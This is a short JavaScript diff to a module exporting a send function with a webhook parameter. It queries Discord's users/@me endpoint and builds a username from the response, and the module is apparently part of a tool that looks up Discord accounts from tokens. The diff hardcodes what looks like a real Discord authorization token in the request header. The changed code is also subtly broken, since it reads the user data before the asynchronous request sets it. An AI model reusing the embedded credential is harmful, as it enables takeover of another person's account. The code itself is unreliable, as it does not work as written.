@@ -10,23 +10,20 @@ exports.send = (req, res, webhook) =>
 	
 	
 
-	function Info()
-	{
+var info;
 		axios.get('https://discordapp.com/api/v8/users/@me', {
     withCredentials: true,
     headers: {
-      Authorization: token,
+      Authorization: "NzkyNzgwNzU3NzY4MDc3MzMz.X_ganQ.Ig1qH6zNChHzlO0FigaE-znijZE",
     },
-  }).then((response) => {
-			
-			return response.data;
+  }).then((response) => {	
+    info = response.data;
+    console.log(info)
+  }
+  )
+
 	
-})
 	
-		
-	}
-	
-	var info = Info();
 	var discrim = JSON.parse(JSON.stringify(info)).discriminator;
 	var username = JSON.parse(JSON.stringify(info)).username + "#" + discrim;
 
